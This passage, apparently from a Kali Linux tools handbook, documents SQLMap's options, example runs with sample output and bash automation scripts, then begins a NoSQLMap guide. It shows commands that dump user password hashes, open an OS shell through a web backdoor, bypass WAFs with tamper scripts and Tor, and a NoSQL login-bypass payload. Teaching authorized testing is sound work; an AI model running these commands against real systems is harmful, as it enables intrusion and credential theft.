Beyond simple data extraction, SQLMap can fingerprint the back-end DBMS and its version, dump entire databases/tables/columns, read and write files on the underlying filesystem (when privileges allow), execute arbitrary operating-system commands via `--os-shell` or `--os-pwn`, establish an out-of-band connection, crack password hashes, and enumerate users, privileges, roles, and databases. It also includes a built-in tamper script engine to bypass Web Application Firewalls (WAFs) and Intrusion Detection/Prevention Systems (IDS/IPS).

---

#### 2. Installation

SQLMap comes **pre-installed on Kali Linux**. You can verify and update it as follows.

###### 2.1 Verify Pre-Installed Version (Kali Linux)

```bash
sqlmap --version
```

###### 2.2 Update via APT (Kali Linux)

```bash
sudo apt update
sudo apt install sqlmap -y
```

###### 2.3 Install/Update from Source (Git — Latest Development Version)

```bash
sudo git clone --depth 1 https://github.com/sqlmapproject/sqlmap.git /opt/sqlmap-dev
cd /opt/sqlmap-dev
python3 sqlmap.py --version
```

###### 2.4 Install via pip (cross-platform)

```bash
pip3 install sqlmap --break-system-packages
```

###### 2.5 Requirements

- Python 3.6 or higher (Python 2.7 for legacy versions)
- Works on Linux, Windows, macOS (any platform with a Python interpreter)

###### 2.6 Verify Installation

```bash
which sqlmap
sqlmap --version
```

Expected output:
```
/usr/bin/sqlmap
1.8.11#stable
```

---

#### 3. Syntax

The general syntax for SQLMap is:

```bash
sqlmap [options]
```

Most common working form:

```bash
sqlmap -u "<target-url>" [detection-options] [enumeration-options] [technique-options] [request-options]
```

Example minimal invocation:

```bash
sqlmap -u "http://target.com/item.php?id=1"
```

---

#### 4. Command-Line Options Reference (Kali Linux)

SQLMap's options are grouped into logical categories. Below is the comprehensive reference as available in the Kali Linux build.

###### 4.1 Target Options
| Option | Description |
|---|---|
| `-u, --url=URL` | Target URL (e.g. `"http://www.site.com/vuln.php?id=1"`) |
| `-g GOOGLEDORK` | Process Google dork results as target URLs |
| `-m BULKFILE` | Scan multiple targets given in a textual file |
| `-r REQUESTFILE` | Load HTTP request from a file (Burp/ZAP-captured request) |
| `-l LOGFILE` | Parse targets from a Burp/WebScarab proxy log |
| `-x SITEMAPURL` | Parse targets from a remote sitemap(.xml) file |
| `--wizard` | Simple wizard interface for beginners |

###### 4.2 Request Options
| Option | Description |
|---|---|
| `--data=DATA` | Data string to be sent through POST |
| `--param-del=PARAM_DEL` | Character used for splitting parameter values |
| `--cookie=COOKIE` | HTTP Cookie header value |
| `--cookie-del=COOKIE_DEL` | Character used for splitting cookie values |
| `--live-cookies=LC` | Live cookies file |
| `--load-cookies=LC` | File containing cookies in Netscape/wget format |
| `--drop-set-cookie` | Ignore Set-Cookie header from response |
| `--http2` | Use HTTP version 2 |
| `--random-agent` | Use randomly selected User-Agent |
| `--host=HOST` | HTTP Host header value |
| `--referer=REFERER` | HTTP Referer header value |
| `-A, --user-agent=AGENT` | HTTP User-Agent header value |
| `-H, --header=HEADER` | Extra header (e.g. `"X-Forwarded-For: 127.0.0.1"`) |
| `--headers=HEADERS` | Extra headers, newline separated |
| `--auth-type=AUTH_TYPE` | HTTP authentication type (Basic, Digest, Bearer, NTLM) |
| `--auth-cred=AUTH_CRED` | HTTP authentication credentials (`name:password`) |
| `--auth-file=AUTH_FILE` | HTTP authentication PEM cert/private key file |
| `--abort-code=ABORT_CODE` | HTTP code(s) to abort on (comma separated) |
| `--ignore-code=IGNORE_CODE` | HTTP error code(s) to ignore |
| `--ignore-proxy` | Ignore system default proxy |
| `--ignore-redirects` | Ignore redirection attempts |
| `--ignore-timeouts` | Ignore connection timeouts |
| `--proxy=PROXY` | Use a proxy (e.g. `http://127.0.0.1:8080`) |
| `--proxy-cred=PROXY_CRED` | Proxy authentication credentials |
| `--proxy-file=PROXY_FILE` | Load proxy list from a file |
| `--tor` | Use the Tor anonymity network |
| `--tor-port=TOR_PORT` | Set Tor proxy port |
| `--tor-type=TOR_TYPE` | Tor proxy type (HTTP, SOCKS4, SOCKS5) |
| `--check-tor` | Check whether Tor is used properly |
| `--delay=DELAY` | Delay in seconds between HTTP requests |
| `--timeout=TIMEOUT` | Seconds to wait before connection timeout |
| `--retries=RETRIES` | Retries when connection times out |
| `--randomize=RPARAM` | Randomize the value for given parameter |
| `--safe-url=SAFURL` | URL to visit frequently during testing |
| `--safe-freq=SAFEFREQ` | Test requests between safe URL visits |
| `--skip-urlencode` | Skip URL encoding of payload data |
| `--csrf-token=CSRF_TOKEN` | Parameter name holding an anti-CSRF token |
| `--csrf-url=CSRF_URL` | URL to visit for extracting anti-CSRF token |
| `--force-ssl` | Force usage of SSL/HTTPS |
| `--chunked` | Use HTTP chunked transfer encoded (POST) requests |
| `--hpp` | Use HTTP parameter pollution |
| `--eval=EVALCODE` | Evaluate provided Python code before request |

###### 4.3 Optimization Options
| Option | Description |
|---|---|
| `-o` | Turn on all optimization switches |
| `--predict-output` | Predict common queries output |
| `--keep-alive` | Use persistent HTTP(s) connections |
| `--null-connection` | Retrieve page length without an actual HTTP response body |
| `--threads=THREADS` | Max number of concurrent HTTP requests (max 10) |

###### 4.4 Injection Options
| Option | Description |
|---|---|
| `-p TESTPARAMETER` | Testable parameter(s) |
| `--skip=SKIP` | Skip testing for given parameter(s) |
| `--skip-static` | Skip testing parameters not appearing dynamic |
| `--param-exclude=REGEX` | Regex to exclude parameters from testing |
| `--dbms=DBMS` | Force back-end DBMS to this value |
| `--dbms-cred=DBMS_CRED` | DBMS authentication credentials |
| `--os=OS` | Force back-end DBMS operating system |
| `--invalid-bignum` | Use big numbers for invalidating values |
| `--invalid-logical` | Use logical operations for invalidating values |
| `--invalid-string` | Use random strings for invalidating values |
| `--no-cast` | Turn off payload casting mechanism |
| `--no-escape` | Turn off string escaping mechanism |
| `--prefix=PREFIX` | Injection payload prefix string |
| `--suffix=SUFFIX` | Injection payload suffix string |
| `--tamper=TAMPER` | Use tamper script(s) for bypassing WAF/IPS |

###### 4.5 Detection Options
| Option | Description |
|---|---|
| `--level=LEVEL` | Level of tests to perform (1–5, default 1) |
| `--risk=RISK` | Risk of tests to perform (1–3, default 1) |
| `--string=STRING` | String to match when query is evaluated as True |
| `--not-string=NOT_STRING` | String to match when query is evaluated as False |
| `--regexp=REGEXP` | Regex to match when query is evaluated as True |
| `--code=CODE` | HTTP code to match when query is evaluated as True |
| `--smart` | Perform thorough tests only if positive heuristic |
| `--text-only` | Compare pages based on textual content only |
| `--titles` | Compare pages based on their titles only |

###### 4.6 Techniques Options
| Option | Description |
|---|---|
| `--technique=TECH` | SQL injection techniques to use (default `BEUSTQ`) |
| `--time-sec=TIMESEC` | Seconds to delay the DBMS response (time-based) |
| `--union-cols=UCOLS` | Range of columns to test for UNION query SQLi |
| `--union-char=UCHAR` | Character to use for bruteforcing column count |
| `--union-from=UFROM` | Table to use in FROM part of UNION query SQLi |
| `--union-values=UVALUES` | Column values to use for UNION query SQLi |
| `--dns-domain=DNS_DOMAIN` | Domain name used for DNS exfiltration attack |
| `--second-order=SECOND_ORDER` | Resulting page URL searched for second-order response |

*(Technique letters: B=Boolean-based blind, E=Error-based, U=UNION query-based, S=Stacked queries, T=Time-based blind, Q=Inline queries, O=Out-of-band)*

###### 4.7 Fingerprint Options
| Option | Description |
|---|---|
| `-f, --fingerprint` | Perform extensive DBMS version fingerprint |

###### 4.8 Enumeration Options
| Option | Description |
|---|---|
| `-a, --all` | Retrieve everything |
| `-b, --banner` | Retrieve DBMS banner |
| `--current-user` | Retrieve DBMS current user |
| `--current-db` | Retrieve DBMS current database |
| `--hostname` | Retrieve DBMS server hostname |
| `--is-dba` | Detect if current user is DBA |
| `--users` | Enumerate DBMS users |
| `--passwords` | Enumerate DBMS users password hashes |
| `--privileges` | Enumerate DBMS users privileges |
| `--roles` | Enumerate DBMS users roles |
| `--dbs` | Enumerate DBMS databases |
| `--tables` | Enumerate DBMS database tables |
| `--columns` | Enumerate DBMS database table columns |
| `--schema` | Enumerate DBMS schema |
| `--count` | Retrieve number of entries for table(s) |
| `--dump` | Dump DBMS database table entries |
| `--dump-all` | Dump all DBMS databases tables entries |
| `--search` | Search for column(s), table(s), and/or database name(s) |
| `--comments` | Retrieve DBMS comments |
| `--statements` | Retrieve SQL statements being run on DBMS |
| `-D DB` | DBMS database to enumerate |
| `-T TBL` | DBMS database table(s) to enumerate |
| `-C COL` | DBMS database table column(s) to enumerate |
| `-X EXCLUDECOL` | DBMS database table column(s) to not enumerate |
| `-U USER` | DBMS user to enumerate |
| `--exclude-sysdbs` | Exclude DBMS system databases when enumerating |
| `--pivot-column=PIVOT_COLUMN` | Pivot column name |
| `--where=DUMPWHERE` | Use WHERE condition while dumping entries |
| `--start=LIMITSTART` | First dump table entry to retrieve |
| `--stop=LIMITSTOP` | Last dump table entry to retrieve |
| `--first=FIRSTCHAR` | First query output word character to retrieve |
| `--last=LASTCHAR` | Last query output word character to retrieve |
| `--sql-query=QUERY` | SQL statement to be executed |
| `--sql-shell` | Prompt for an interactive SQL shell |
| `--sql-file=SQLFILE` | Execute SQL statements from a given file |

###### 4.9 Brute Force Options
| Option | Description |
|---|---|
| `--common-tables` | Check existence of common tables |
| `--common-columns` | Check existence of common columns |
| `--common-files` | Check existence of common files |

###### 4.10 User-Defined Function Injection
| Option | Description |
|---|---|
| `--udf-inject` | Inject custom user-defined functions |
| `--shared-lib=SHLIB` | Local path of shared library |

###### 4.11 File System Access
| Option | Description |
|---|---|
| `--file-read=RFILE` | Read a file from the back-end DBMS filesystem |
| `--file-write=WFILE` | Write a local file on the back-end DBMS filesystem |
| `--file-dest=DFILE` | Back-end DBMS absolute filepath to write to |

###### 4.12 Operating System Access
| Option | Description |
|---|---|
| `--os-cmd=OSCMD` | Execute an operating system command |
| `--os-shell` | Prompt for an interactive operating system shell |
| `--os-pwn` | Prompt for OOB shell, Meterpreter, or VNC |
| `--os-smbrelay` | One-click OOB shell/Meterpreter/VNC via SMB relay |
| `--os-bof` | Stored procedure buffer overflow exploitation |
| `--priv-esc` | Database process user privilege escalation |
| `--msf-path=MSFPATH` | Local path to Metasploit Framework installation |
| `--tmp-path=TMPPATH` | Remote absolute path of temporary files directory |

###### 4.13 Windows Registry Access
| Option | Description |
|---|---|
| `--reg-read` | Read a Windows registry key value |
| `--reg-add` | Write a Windows registry key value |
| `--reg-del` | Delete a Windows registry key value |
| `--reg-key=REGKEY` | Windows registry key |
| `--reg-value=REGVAL` | Windows registry key value |
| `--reg-data=REGDATA` | Windows registry key value data |
| `--reg-type=REGTYPE` | Windows registry key value type |

###### 4.14 General Options
| Option | Description |
|---|---|
| `-s SESSIONFILE` | Load session from a stored (.sqlite) file |
| `-t TRAFFICFILE` | Log all HTTP traffic into a textual file |
| `--answers=ANSWERS` | Set predefined answers (e.g. `"quit=N,follow=N"`) |
| `--base64=BASE64PARAM` | Parameter(s) containing Base64 encoded data |
| `--base64-safe` | Use URL and filename safe Base64 alphabet |
| `--batch` | Never ask for user input, use default behavior |
| `--binary-fields=BF` | Result fields to be treated as binary |
| `--check-internet` | Check Internet connection before assessing target |
| `--cleanup` | Clean up DBMS from sqlmap-specific UDFs/tables |
| `--crawl=CRAWLDEPTH` | Crawl the website from target URL |
| `--crawl-exclude=CE` | Regex to exclude pages from crawling |
| `--csv-del=CSVDEL` | Delimiter to use in CSV output |
| `--charset=CHARSET` | Blind SQLi charset (heuristic charset guessing) |
| `--dump-file=DF` | Store dumped data into a custom file |
| `--dump-format=DF` | Format of dumped data (CSV, HTML, SQLITE) |
| `--eta` | Display for each output the estimated time of arrival |
| `--flush-session` | Flush session files for current target |
| `--forms` | Parse and test forms on target URL |
| `--fresh-queries` | Ignore query results stored in session file |
| `--gpage=GOOGLEPAGE` | Use Google dork results from specified page |
| `--identify-waf` | Perform thorough WAF/IPS/IDS identification |
| `--ignore-401` | Ignore HTTP error 401 (Unauthorized) |
| `--list-tampers` | Display list of available tamper scripts |
| `--mobile` | Imitate smartphone via HTTP User-Agent header |
| `--offline` | Work in offline mode (only use session data) |
| `--output-dir=OD` | Custom output directory path |
| `--parse-errors` | Parse and display DBMS error messages from responses |
| `--preprocess=PREPROCESS` | Preprocess input (e.g. header values) with given script |
| `--postprocess=POSTPROCESS` | Postprocess output with given script |
| `--repair` | Redump entries with unknown character marker |
| `--save=SAVECONFIG` | Save options to a configuration INI file |
| `--scope=SCOPE` | Regex to filter targets from provided input |
| `--test-filter=TF` | Select tests by payload/title regex |
| `--test-skip=TS` | Skip tests by payload/title regex |
| `--update` | Update sqlmap |

###### 4.15 Miscellaneous Options
| Option | Description |
|---|---|
| `-z MNEMONICS` | Use short mnemonics (e.g. `"flu,bat,ban,tec=EU"`) |
| `--alert=ALERT` | Run host OS command(s) when SQLi is found |
| `--beep` | Beep on question and/or when SQLi is found |
| `--dependencies` | Check for missing (non-core) sqlmap dependencies |
| `--disable-coloring` | Disable console output coloring |
| `--disable-hashing` | Disable hash analysis and cracking |
| `--list-tampers` | List available tamper scripts |
| `--purge` | Safely remove sqlmap's data directory |
| `--results-file=RF` | Multiple targets results file location |
| `--shell` | Prompt for interactive sqlmap shell |
| `--tmp-dir=TMPDIR` | Local directory for storing temp files |
| `--unstable` | Adjust options for unstable connections |
| `--update` | Update sqlmap to the latest development version |
| `--wizard` | Simple wizard interface for beginners |
| `-h, --help` | Show basic help message and exit |
| `-hh` | Show advanced help message and exit |
| `--version` | Show program version and exit |
| `-v VERBOSE` | Verbosity level (0–6, default 1) |

#### 5. Basic Usage (Expected Output in Bash)

```bash
sqlmap -u "http://testphp.vulnweb.com/artists.php?artist=1"
```

Expected output:
```
        ___
       __H__
 ___ ___[.]_____ ___ ___  {1.8.11#stable}
|_ -| . [.]     | .'| . |
|___|_  [.]_|_|_|__,|  _|
      |_|V...       |_|   https://sqlmap.org

[!] legal disclaimer: Usage of sqlmap for attacking targets without prior mutual consent is illegal.

[*] starting @ 10:41:02 /2026-07-19/

[10:41:02] [INFO] testing connection to the target URL
[10:41:03] [INFO] testing if the target URL content is stable
[10:41:03] [INFO] target URL content is stable
[10:41:03] [INFO] testing if GET parameter 'artist' is dynamic
[10:41:03] [INFO] GET parameter 'artist' appears to be dynamic
[10:41:04] [INFO] heuristic (basic) test shows that GET parameter 'artist' might be injectable
[10:41:04] [INFO] testing for SQL injection on GET parameter 'artist'
[10:41:05] [INFO] GET parameter 'artist' is 'AND boolean-based blind - WHERE or HAVING clause' injectable
[10:41:07] [INFO] GET parameter 'artist' is 'MySQL >= 5.0 AND error-based - WHERE, HAVING, ORDER BY or GROUP BY clause' injectable
[10:41:09] [INFO] GET parameter 'artist' appears to be 'MySQL >= 5.0.12 AND time-based blind' injectable
sqlmap identified the following injection point(s) with a total of 47 HTTP(s) requests:
---
Parameter: artist (GET)
    Type: boolean-based blind
    Title: AND boolean-based blind - WHERE or HAVING clause
    Payload: artist=1 AND 1=1

    Type: error-based
    Title: MySQL >= 5.0 AND error-based - WHERE, HAVING, ORDER BY or GROUP BY clause
    Payload: artist=1 AND (SELECT 2*(IF((1=1),1,0)))

    Type: time-based blind
    Title: MySQL >= 5.0.12 AND time-based blind
    Payload: artist=1 AND (SELECT * FROM (SELECT(SLEEP(5)))a)
---
[10:41:10] [INFO] the back-end DBMS is MySQL
web server operating system: Linux Ubuntu
web application technology: PHP 7.4.3, Apache 2.4.41
back-end DBMS: MySQL >= 5.0
[10:41:10] [INFO] fetched data logged to text files under '/root/.local/share/sqlmap/output/testphp.vulnweb.com'
[*] ending @ 10:41:10 /2026-07-19/
```

#### 6. Practical Examples with Output in Bash

###### Example 1 — Basic Detection

```bash
sqlmap -u "http://target.com/product.php?id=3" --batch
```
```
[INFO] GET parameter 'id' is 'boolean-based blind' injectable
[INFO] the back-end DBMS is MySQL
[10:42:11] [INFO] fetching current user and database is skipped in batch mode without -a/--all
```

###### Example 2 — Enumerate Databases

```bash
sqlmap -u "http://target.com/product.php?id=3" --dbs --batch
```
```
available databases [3]:
[*] information_schema
[*] shopdb
[*] mysql
```

###### Example 3 — Enumerate Tables in a Database

```bash
sqlmap -u "http://target.com/product.php?id=3" -D shopdb --tables --batch
```
```
Database: shopdb
[4 tables]
+------------+
| users      |
| products   |
| orders     |
| categories |
+------------+
```

###### Example 4 — Enumerate Columns of a Table

```bash
sqlmap -u "http://target.com/product.php?id=3" -D shopdb -T users --columns --batch
```
```
Table: users
[4 columns]
+----------+-------------+
| Column   | Type        |
+----------+-------------+
| id       | int(11)     |
| username | varchar(50) |
| password | varchar(255)|
| email    | varchar(100)|
+----------+-------------+
```

###### Example 5 — Dump Table Data

```bash
sqlmap -u "http://target.com/product.php?id=3" -D shopdb -T users -C username,password --dump --batch
```
```
Database: shopdb
Table: users
[3 entries]
+----------+----------------------------------+
| username | password                         |
+----------+----------------------------------+
| admin    | 5f4dcc3b5aa765d61d8327deb882cf99 |
| bob      | e10adc3949ba59abbe56e057f20f883e |
| alice    | 25d55ad283aa400af464c76d713c07ad |
+----------+----------------------------------+
```

###### Example 6 — Using a POST Request from a Burp Suite Capture

```bash
sqlmap -r login_request.txt -p username --batch --dbs
```
```
[INFO] testing if POST parameter 'username' is dynamic
[INFO] POST parameter 'username' appears to be 'AND boolean-based blind' injectable
available databases [2]:
[*] webapp
[*] information_schema
```

###### Example 7 — Testing with Cookie-Based Session and Level/Risk Tuning

```bash
sqlmap -u "http://target.com/dashboard.php" --cookie="PHPSESSID=abc123; security=low" --level=5 --risk=3 --batch
```
```
[10:55:20] [INFO] testing cookie parameter 'security'
[10:55:22] [INFO] cookie parameter 'security' is 'time-based blind' injectable
```

###### Example 8 — Bypassing a WAF with a Tamper Script

```bash
sqlmap -u "http://target.com/search.php?q=test" --tamper=space2comment --batch
```
```
[11:02:03] [INFO] loading tamper module 'space2comment'
[11:02:05] [INFO] GET parameter 'q' appears to be 'time-based blind' injectable
```

###### Example 9 — Getting an Interactive OS Shell

```bash
sqlmap -u "http://target.com/product.php?id=3" --os-shell --batch
```
```
[INFO] the back-end DBMS is MySQL
[INFO] going to use a web backdoor for command execution
[INFO] the web application directory is writable
os-shell> whoami
do you want to retrieve the command standard output? [Y/n] Y
command standard output: 'www-data'
```

###### Example 10 — Running a Custom SQL Query

```bash
sqlmap -u "http://target.com/product.php?id=3" --sql-query="SELECT version()" --batch
```
```
[11:10:44] [INFO] fetching SQL SELECT statement query output: 'SELECT version()'
[*] 10.6.12-MariaDB-0ubuntu0.22.04.1
```

###### Example 11 — Scanning Multiple Targets from a File

```bash
sqlmap -m targets.txt --batch --dbs
```
```
[11:15:02] [INFO] URL 1/5 (http://site1.com/id.php?id=1):
available databases [2]: [*] site1db [*] information_schema
[11:15:20] [INFO] URL 2/5 (http://site2.com/prod.php?p=4):
[WARNING] parameter 'p' does not seem injectable
```

###### Example 12 — Crawling a Site for Injectable Forms

```bash
sqlmap -u "http://target.com" --crawl=2 --forms --batch
```
```
[11:20:11] [INFO] starting crawler for target URL 'http://target.com'
[11:20:14] [INFO] searched for 12 pages, 3 with forms
[11:20:16] [INFO] found 1 injectable form: /search.php (POST)
```

---

#### 7. Common Use Cases

- **Vulnerability confirmation** during authorized web application penetration tests to prove exploitability of a suspected SQLi finding.
- **Database enumeration and data extraction** in CTFs and lab environments (DVWA, bWAPP, PortSwigger Academy).
- **Post-injection OS command execution** to demonstrate full-chain impact (RCE via SQLi) in a red team engagement report.
- **Credential harvesting** from `users`/`admin` tables to demonstrate credential exposure risk.
- **WAF/IPS bypass testing** using tamper scripts to assess the effectiveness of deployed web application firewalls.
- **Mass scanning** of many endpoints (via `-m`) during large-scope authorized assessments.
- **API/JSON parameter testing** using `--data` with JSON bodies to test REST APIs for injectable fields.
- **Second-order SQLi discovery**, where injected input is stored and later executed in a different request/page.

---

#### 8. Automation with Bash

###### 8.1 Simple Batch Scanner Script

```bash
#!/bin/bash
# scan_targets.sh - Automate sqlmap scanning across a list of URLs

TARGET_FILE="targets.txt"
OUTPUT_DIR="sqlmap_results_$(date +%Y%m%d_%H%M%S)"
mkdir -p "$OUTPUT_DIR"

while IFS= read -r url; do
    echo "[*] Scanning: $url"
    domain=$(echo "$url" | awk -F/ '{print $3}')
    sqlmap -u "$url" --batch --level=3 --risk=2 --dbs \
        --output-dir="$OUTPUT_DIR" \
        2>&1 | tee "$OUTPUT_DIR/${domain}.log"
    echo "[*] Done: $url"
    echo "----------------------------------------"
done < "$TARGET_FILE"

echo "[+] All scans complete. Results in $OUTPUT_DIR"
```

Run it:
```bash
chmod +x scan_targets.sh
./scan_targets.sh
```

###### 8.2 Automated Dump-If-Vulnerable Pipeline

```bash
#!/bin/bash
# auto_dump.sh - Detect SQLi, then automatically dump if found

URL="$1"
if [ -z "$URL" ]; then
    echo "Usage: $0 <target-url>"
    exit 1
fi

echo "[*] Testing $URL for SQL injection..."
sqlmap -u "$URL" --batch --level=2 --risk=1 > /tmp/sqlmap_scan.log 2>&1

if grep -q "is vulnerable" /tmp/sqlmap_scan.log || grep -q "injectable" /tmp/sqlmap_scan.log; then
    echo "[+] Target appears injectable. Extracting databases..."
    sqlmap -u "$URL" --batch --dbs
else
    echo "[-] No injection point found."
fi
```

###### 8.3 Cron-Based Recurring Authorized Scan

```bash
# crontab -e
# Run authorized weekly scan every Monday at 2 AM against staging environment
0 2 * * 1 /usr/bin/sqlmap -u "http://staging.internal.corp/id.php?id=1" --batch --level=3 --risk=2 --output-dir=/var/log/sqlmap >> /var/log/sqlmap/cron.log 2>&1
```

---

#### 9. Tips and Best Practices

- Always start with `--level=1 --risk=1` and increase gradually; higher levels/risks generate many more requests and can trigger WAFs, rate limits, or even data modification on risk 3.
- Use `--batch` for unattended automation, but review results manually for false positives before reporting.
- Prefer `-r request.txt` (a raw HTTP request saved from Burp Suite) over manually crafting `-u`/`--data`/`--cookie` flags — it's far less error-prone for complex requests with tokens/headers.
- Use `--random-agent` and `--delay` to reduce fingerprinting and avoid overwhelming the target server.
- Save session state with `-s session.sqlite` so long scans can be resumed without re-running detection.
- Use `--flush-session` if the target application has changed and cached session data is stale/misleading.
- Combine `--dbms=mysql` (or the correct DBMS) when you already know the back end — it speeds up testing significantly by skipping irrelevant payloads.
- Use `--tamper` scripts thoughtfully — apply only the ones relevant to the WAF/filter you're facing, chaining too many can break payload syntax.
- Always test against a staging/lab copy first if `--risk=3` (destructive tests, e.g. `OR TIME-BASED` heavy queries) is required.
- Use `--technique=` to narrow down which SQLi types to test, reducing time when you already know a specific technique works.

---

#### 10. Troubleshooting

| Problem | Cause | Solution |
|---|---|---|
| `unable to connect to the target URL` | Target down, wrong URL, network/proxy issue | Verify URL in browser; check `--proxy`; check `--timeout` |
| `parameter appears to be dynamic but no injection found` | Insufficient level/risk, WAF filtering payloads | Increase `--level`/`--risk`; try `--tamper` scripts |
| Scan hangs indefinitely | Target rate-limiting or unstable connection | Add `--timeout`, `--retries`, `--unstable` |
| `all tested parameters do not appear to be injectable` | Parameter genuinely not injectable, or requires POST/cookie testing | Test other injection points: cookies, headers, JSON body via `--data` |
| False positive boolean-based detection | Unstable page content (ads, timestamps) | Use `--text-only` or `--string`/`--not-string` for stable markers |
| `os-shell` fails to upload web backdoor | Web root not writable, wrong absolute path guessed | Manually specify `--web-root=/var/www/html` |
| Session data seems outdated after app changes | Cached `.sqlite` session file | Run with `--flush-session` |
| WAF blocking all requests (403s) | IP-based blocking / signature detection | Use `--tor`, `--tamper`, rotate `--proxy`, add delay |
| `ERROR: invalid URL` | Missing scheme (`http://`/`https://`) or malformed URL | Ensure full URL with scheme is passed to `-u` |
| Garbled/incorrect dumped data | Non-standard charset | Use `--charset=` to specify correct character set |

---

#### 11. References

- Official website: https://sqlmap.org
- GitHub repository: https://github.com/sqlmapproject/sqlmap
- Official user's manual/wiki: https://github.com/sqlmapproject/sqlmap/wiki
- Kali Linux tool page: https://www.kali.org/tools/sqlmap/
- OWASP SQL Injection reference: https://owasp.org/www-community/attacks/SQL_Injection
- PortSwigger Web Security Academy (SQL injection labs): https://portswigger.net/web-security/sql-injection

### 7.2 NoSQLMap

#### 1. Tool Introduction

NoSQLMap is an open-source Python tool designed to audit for, and automate exploitation of, NoSQL injection vulnerabilities, primarily targeting MongoDB, and to expose insecure configurations in Node.js applications built on Express and Mongoose. It was inspired directly by SQLMap and was created to fill a gap in tooling as NoSQL databases became widely adopted in modern web application stacks, particularly the MEAN/MERN stack (MongoDB, Express, Angular/React, Node.js).

Unlike traditional relational SQL injection, NoSQL injection exploits the way applications construct queries as JSON/BSON objects (in the case of MongoDB) rather than string-concatenated SQL statements. This means attacks typically abuse JavaScript operators like `$where`, `$ne`, `$gt`, `$regex`, and `$in`, or exploit type-juggling issues where an attacker submits an array or object instead of a string, bypassing authentication logic (`{"username": {"$ne": null}, "password": {"$ne": null}}`).

NoSQLMap provides a menu-driven interactive interface (similar to tools like `msfconsole`) that walks the tester through several attack categories:

- **MongoDB database enumeration** — via direct network access to a MongoDB instance to enumerate/dump databases and collections.
- **PHP application NoSQL injection** — testing PHP-based apps that use MongoDB drivers for injectable parameters.
- **Web application NoSQL injection attacks** — timing- and Boolean-based blind injection against web forms/APIs to extract usernames, passwords, or bypass authentication.
- **Node.js/MongoDB DoS testing** — testing for denial-of-service conditions via crafted `$where` JavaScript payloads that can consume excessive server resources.
- **Scanning for default/weak MongoDB installs** — checking for unauthenticated MongoDB instances exposed to the network (a very common misconfiguration).

NoSQLMap ships in the Kali Linux repositories and is also available directly from its GitHub repository for manual installation.

---

#### 2. Installation

###### 2.1 Kali Linux (APT)

```bash
sudo apt update
sudo apt install nosqlmap -y
```

###### 2.2 From Source (GitHub)

```bash
sudo git clone https://github.com/codingo/NoSQLMap.git /opt/nosqlmap
cd /opt/nosqlmap
sudo pip3 install -r requirements.txt --break-system-packages
sudo python3 setup.py install
```

###### 2.3 Requirements

- Python 2.7 (legacy original) or the maintained Python 3 fork
- `pymongo` library (for direct MongoDB interaction)
- A MongoDB client library installed on the attacking machine
- Optional: local MongoDB instance for testing/lab replication

###### 2.4 Verify Installation

```bash
nosqlmap --help
```

or, if launched from source:

```bash
cd /opt/nosqlmap
python3 nosqlmap.py
```

Expected output (menu banner):
```
 __   _  ____  ____   __    __  __    __  ____
( (` / )(  __)(  _ \ (  )  (  \/  )  / _\(  _ \
 `\ \/ /  ) _)  __ /  (_)  )    (  /    \)   /
 (_)\__/  (__)  (_)_\  __) (_/\/\_) \_/\_/(__\_)

NoSQLMap - Automated NoSQL Attack Tool

Main Menu:
   1) Set options (do this first)
   2) NoSQL DB Access Attacks (via MongoDB)
   3) NoSQL Web App attack (via HTTP)
   4) Scan for Anonymous MongoDB Access
   x) Exit

Enter your selection >
```

---

#### 3. Syntax

NoSQLMap is primarily **menu-driven**, unlike SQLMap's flag-based CLI. It is launched with no arguments and options are configured interactively:

```bash
python3 nosqlmap.py
```

Some forked/updated versions also accept limited command-line flags for scripted use:

```bash
nosqlmap [-t TARGET] [-p PORT] [--scan] [--attack MODE]
```

---

#### 4. Command Line / Menu Options Reference (Kali Linux)

Because NoSQLMap is interactive, its "options" are represented as numbered menu selections. Below is the complete reference of every option exposed by the tool.

###### 4.1 Main Menu
| Option | Description |
|---|---|
| `1` | Set options (target host, port, URLs, HTTP headers, request data — must be configured first) |
| `2` | NoSQL DB Access Attacks (direct attacks against a MongoDB instance) |
| `3` | NoSQL Web App attack (via HTTP, targeting a web application's injectable parameters) |
| `4` | Scan for Anonymous MongoDB Access (network-wide scan for unauthenticated MongoDB) |
| `x` | Exit the application |

###### 4.2 "Set Options" Submenu (Option 1)
| Field | Description |
|---|---|
| IP/Host | Target host/IP address of the MongoDB server or web application |
| Ports | Target port(s), default MongoDB port is 27017 |
| Target URL | Full URL of the vulnerable web application endpoint |
| HTTP Method | GET or POST |
| POST/GET Data | Injectable request body / query string |
| Cookies | Session cookie value(s) for authenticated testing |
| Injected Parameter | The specific parameter to fuzz for NoSQL injection |
| Proxy | HTTP proxy for routing requests (e.g. through Burp Suite) |
| Request Headers | Custom headers (User-Agent, Authorization, etc.) |
| Time-based Delay | Delay threshold (seconds) used for timing-based blind detection |

###### 4.3 "NoSQL DB Access Attacks" Submenu (Option 2)
| Option | Description |
|---|---|
| Enumerate database names | Lists all databases on the target MongoDB instance |
| Enumerate collection names | Lists all collections within a chosen database |
| Dump collection data | Extracts all documents from a chosen collection |
| Clone entire database | Copies a full remote database to the attacker's local MongoDB |
| Add administrative user | Attempts to add a rogue admin user to the target MongoDB |
| Test for anonymous access | Confirms whether the instance requires no authentication |

###### 4.4 "NoSQL Web App Attack" Submenu (Option 3)
| Option | Description |
|---|---|
| Attempt login bypass | Injects operators like `$ne`, `$gt`, `$regex` to bypass authentication |
| PHP array injection attack | Tests for PHP `$_GET`/`$_POST` array-based injection (`param[$ne]=1`) |
| Extract data via timing attack | Uses `$where` JavaScript sleep-based timing to blindly extract data character-by-character |
| Extract usernames via time-based blind | Iteratively brute-forces username/password fields using response timing |
| Test for MongoDB DoS via $where | Sends resource-intensive `$where` payloads to test denial-of-service potential |
| Replay captured request with payloads | Uses a captured HTTP request (from Burp/proxy) as a base template for injection |

###### 4.5 "Scan for Anonymous MongoDB Access" (Option 4)
| Option | Description |
|---|---|
| Single IP scan | Scans one target IP on port 27017 (or custom port) for unauthenticated access |
| IP range/CIDR scan | Scans a network range for open, unauthenticated MongoDB instances |
| Export results | Saves scan results (open instances found) to a local file |

---

#### 5. Basic Usage (Expected Output in Bash)

```bash
cd /opt/nosqlmap
sudo python3 nosqlmap.py
```

Expected output:
```
NoSQLMap - Automated NoSQL Attack Tool

Main Menu:
   1) Set options (do this first)
   2) NoSQL DB Access Attacks (via MongoDB)
   3) NoSQL Web App attack (via HTTP)
   4) Scan for Anonymous MongoDB Access
   x) Exit

Enter your selection > 1

--- Set Options ---
IP/Host [None]: 192.168.56.101
Web App Port [80]: 3000
MongoDB Port [27017]: 27017
Target URL Path [None]: /login
